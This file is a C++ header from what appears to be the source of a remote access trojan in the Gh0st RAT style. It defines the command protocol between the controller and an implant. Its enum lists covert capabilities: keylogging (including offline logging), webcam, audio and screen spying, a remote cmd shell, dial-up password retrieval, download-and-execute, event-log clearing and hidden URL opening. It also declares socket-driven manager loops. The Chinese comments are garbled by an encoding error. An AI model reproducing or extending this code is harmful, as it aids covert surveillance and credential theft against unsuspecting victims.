#ifndef _COMMON_H
#define _COMMON_H

#include <stdlib.h>
#include <PROCESS.H>
#include <WINSOCK2.H>

#pragma comment(lib,"ws2_32")



enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������
	
	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
	
	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_SERVICES,				// �������
    COMMAND_SERVICELIST,            // ˢ�·����б�        
	COMMAND_SERVICECONFIG,          // ����˷����ı�ʶ
	COMMAND_REGEDIT,                // ע������
	COMMAND_REG_FIND,               // ע��� �����ʶ

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣
	
	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������


	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������
	
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������
	
	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ

	COMMAND_TALK,
	TOKEN_SERVERLIST,                  //�����б�
	TOKEN_REGEDIT,                     //ע����ʼ�����
	TOKEN_REG_PATH,                    //ע��������
	TOKEN_REG_KEY                      //ע�������
};




typedef struct 
{
	unsigned ( __stdcall *start_address )(void*);   //ǿ�����͵�ת������
	void	*arglist;
	bool	bInteractive; // �Ƿ�֧�ֽ�������
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;  //behin

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, 
					   SIZE_T dwStackSize,                      
					   LPTHREAD_START_ROUTINE lpStartAddress,    
					   LPVOID lpParameter,                       
					   DWORD dwCreationFlags,                   
                       LPDWORD lpThreadId, bool bInteractive = false);


DWORD WINAPI LoopShellManager(SOCKET sRemote);
DWORD WINAPI LoopSystemManager(SOCKET sRemote);
DWORD WINAPI LoopWindowManager(SOCKET sRemote);
DWORD WINAPI LoopFileManager(SOCKET sRemote);
DWORD WINAPI LoopAudioManager(SOCKET sRemote);
DWORD WINAPI LoopScreenManager(SOCKET sRemote);
DWORD WINAPI LoopVideoManager(SOCKET sRemote);
DWORD WINAPI LoopTalkManager(SOCKET sRemote);
DWORD WINAPI LoopRegeditManager(SOCKET sRemote);
DWORD WINAPI LoopServicesManager(SOCKET sRemote);
bool SwitchInputDesktop();



#define MAX_CURSOR_TYPE	16
class CCursorInfo  
{
private:
	LPCTSTR	m_CursorResArray[MAX_CURSOR_TYPE];
	HCURSOR	m_CursorHandleArray[MAX_CURSOR_TYPE];
	
public:
	CCursorInfo()
	{
		LPCTSTR	CursorResArray[MAX_CURSOR_TYPE] = 
		{
			IDC_APPSTARTING,
				IDC_ARROW,
				IDC_CROSS,
				IDC_HAND,
				IDC_HELP,
				IDC_IBEAM,
				IDC_ICON,
				IDC_NO,
				IDC_SIZE,
				IDC_SIZEALL,
				IDC_SIZENESW,
				IDC_SIZENS,
				IDC_SIZENWSE,
				IDC_SIZEWE,
				IDC_UPARROW,
				IDC_WAIT
		};
		
		for (int i = 0; i < MAX_CURSOR_TYPE; i++)
		{
			m_CursorResArray[i] = CursorResArray[i];
			m_CursorHandleArray[i] = LoadCursor(NULL, CursorResArray[i]);
		}
	}
	
	virtual ~CCursorInfo()
	{
		for (int i = 0; i < MAX_CURSOR_TYPE; i++)
			DestroyCursor(m_CursorHandleArray[i]);
	}
	
	
	int getCurrentCursorIndex()
	{
		CURSORINFO	ci;
		ci.cbSize = sizeof(CURSORINFO);
		if (!GetCursorInfo(&ci) || ci.flags != CURSOR_SHOWING)
			return -1;
		
		int i;
		for (i = 0; i < MAX_CURSOR_TYPE; i++)
		{
			if (ci.hCursor == m_CursorHandleArray[i])
				break;
		}
		DestroyCursor(ci.hCursor);
		
		int	nIndex = i == MAX_CURSOR_TYPE ? -1 : i;
		return nIndex;
	}
	
	HCURSOR getCursorHandle( int nIndex )
	{
		if (nIndex >= 0 && nIndex < MAX_CURSOR_TYPE)
			return	m_CursorHandleArray[nIndex];
		else
			return NULL;
	}
};

#endif 